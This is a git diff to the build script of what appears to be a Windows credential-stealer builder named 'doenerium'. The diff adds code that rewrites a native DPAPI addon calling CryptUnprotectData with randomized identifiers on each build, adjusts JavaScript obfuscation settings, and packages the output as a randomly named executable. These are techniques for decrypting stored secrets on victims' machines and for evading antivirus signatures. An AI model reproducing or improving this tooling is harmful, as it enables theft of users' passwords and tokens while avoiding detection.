@@ -116,6 +116,18 @@ async function fix_dependencies() {
 
 }
 
+function makeid_var(length) {
+    let result = '';
+    const characters = 'abcdefghijklmnopqrstuvwxyz';
+    const charactersLength = characters.length;
+    let counter = 0;
+    while (counter < length) {
+        result += characters.charAt(Math.floor(Math.random() * charactersLength));
+        counter += 1;
+    }
+    return result;
+}
+
 function makeid(length) {
     let result = '';
     const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
@@ -149,16 +161,16 @@ async function obfuscate(input, output) {
             renameVariables: false,
             controlFlowFlattening: 0,
             globalConcealing: false,
-            stringCompression: 1,
-            stringConcealing: 1,
-            stringEncoding: 1,
-            stringSplitting: 1,
-            deadCode: 1,
-            calculator: 1,
+            stringCompression: 0.5,
+            stringConcealing: 0.5,
+            stringEncoding: 0.5,
+            stringSplitting: 0.5,
+            deadCode: 0.5,
+            calculator: 0,
             compact: true,
             movedDeclarations: false,
             objectExtraction: false,
-            stack: 1,
+            stack: 0,
             duplicateLiteralsRemoval: 0,
             flatten: false,
             dispatcher: 0,
@@ -251,17 +263,123 @@ function get_pkg_cache() {
     return `${pkg_cache_path}\\v3.4`;
 }
 
+async function rename_dapi() {
+    let path = `./node_modules/dapifix/src/node-dpapi.cpp`;
+
+    let content = `#include <node.h>
+#include <nan.h>
+#include <Windows.h>
+#include <dpapi.h>
+
+void UQDJcHcaSaTefKfYStdCYrDvn(Nan::NAN_METHOD_ARGS_TYPE info)
+{
+
+    auto UnEwXzYWTBpnaePEkkNvZrWhM = node::Buffer::Data(info[0]);
+    auto yhKrTZMuRNvScccDUkegDyMQE = node::Buffer::Length(info[0]);
+
+    DATA_BLOB juGsCdDXyXpRnFnbPYMuxJUKm;
+    DATA_BLOB kfghGYAWWyVrmZEpPfDCgUqCg;
+
+    juGsCdDXyXpRnFnbPYMuxJUKm.pbData = reinterpret_cast<BYTE*>(UnEwXzYWTBpnaePEkkNvZrWhM);
+    juGsCdDXyXpRnFnbPYMuxJUKm.cbData = yhKrTZMuRNvScccDUkegDyMQE;
+
+    bool HZECTReECYfAEykgJJsZbnmQC = false;
+
+    HZECTReECYfAEykgJJsZbnmQC = CryptUnprotectData(
+        &juGsCdDXyXpRnFnbPYMuxJUKm,
+        nullptr,
+        nullptr,
+        nullptr,
+        nullptr,
+        0,
+        &kfghGYAWWyVrmZEpPfDCgUqCg);
+
+    auto CwqjUWHQMEHRqGJFVnDcaGhRa = Nan::CopyBuffer(reinterpret_cast<const char*>(kfghGYAWWyVrmZEpPfDCgUqCg.pbData), kfghGYAWWyVrmZEpPfDCgUqCg.cbData).ToLocalChecked();
+    LocalFree(kfghGYAWWyVrmZEpPfDCgUqCg.pbData);
+
+    info.GetReturnValue().Set(CwqjUWHQMEHRqGJFVnDcaGhRa);
+}
+
+NAN_METHOD(unprotectData)
+{
+    UQDJcHcaSaTefKfYStdCYrDvn(info);
+}
+
+NAN_MODULE_INIT(init)
+{
+    Nan::Set(
+        target,
+        Nan::New<v8::String>("unprotectData").ToLocalChecked(),
+        Nan::GetFunction(Nan::New<v8::FunctionTemplate>(unprotectData)).ToLocalChecked());
+}
+
+#if NODE_MAJOR_VERSION >= 10
+NAN_MODULE_WORKER_ENABLED(binding, init)
+#else
+NODE_MODULE(binding, init)
+#endif`
+
+    let splits = content.split(" ");
+
+    let new_vars = {};
+
+    [
+        "CwqjUWHQMEHRqGJFVnDcaGhRa",
+        "UQDJcHcaSaTefKfYStdCYrDvn",
+        "UnEwXzYWTBpnaePEkkNvZrWhM",
+        "yhKrTZMuRNvScccDUkegDyMQE",
+        "juGsCdDXyXpRnFnbPYMuxJUKm",
+        "kfghGYAWWyVrmZEpPfDCgUqCg",
+        "HZECTReECYfAEykgJJsZbnmQC",
+    ].forEach(variable => {
+        let new_var = makeid_var(32);
+        new_vars[variable] = new_var;
+    })
+
+    for (var split in splits) {
+        let string = splits[split];
+        [
+            "CwqjUWHQMEHRqGJFVnDcaGhRa",
+            "UQDJcHcaSaTefKfYStdCYrDvn",
+            "UnEwXzYWTBpnaePEkkNvZrWhM",
+            "yhKrTZMuRNvScccDUkegDyMQE",
+            "juGsCdDXyXpRnFnbPYMuxJUKm",
+            "kfghGYAWWyVrmZEpPfDCgUqCg",
+            "HZECTReECYfAEykgJJsZbnmQC",
+        ].forEach(variable => {
+            string = string.replace(variable, new_vars[variable])
+        })
+
+        splits[split] = string;
+    }
+
+    content = splits.join(" ")
+
+    fs.writeFileSync(path, content)
+}
+
 (async () => {
+    let skip_download_nodejs = Boolean(process.argv[2])
+    if (!skip_download_nodejs) { // idk why but my builder is kinda tripping & this somehow works LMFAO
+        console.log("Downloading Node.js pre-built binary")
+        let start = Date.now()
+        await download("https://github.com/vercel/pkg-fetch/releases/download/v3.5/node-v18.15.0-win-x64", `${get_pkg_cache()}\\built-v18.5.0-win-x64`)
+        console.log(`Downloaded Node.js pre-built binary within ${(Date.now() - start) / 1000} seconds`);
 
+        child_process.execSync(`node build.js true`, {
+            stdio: "inherit"
+        })
 
-    console.log("Downloading Node.js pre-built binary")
-    let start = Date.now()
-    await download("https://github.com/vercel/pkg-fetch/releases/download/v3.5/node-v18.15.0-win-x64", `${get_pkg_cache()}\\built-v18.5.0-win-x64`)
-    console.log(`Downloaded Node.js pre-built binary within ${(Date.now() - start) / 1000} seconds`);
+        return;
+    }
 
     console.log("Checking if all modules are installed")
     await check_all_modules_installed();
     console.log("Checked if all modules are installed")
+
+    console.log(`Modding dapifix`)
+    await rename_dapi();
+    console.log("Modded dapifix");
 
     console.log("Fixing dependencies")
     await fix_dependencies();
@@ -281,6 +399,7 @@ function get_pkg_cache() {
 
     let randomid = makeid(8)
     start = Date.now()
+
     const build = await exe({
         entry: '.',
         out: `./doenerium_${randomid}.exe`,
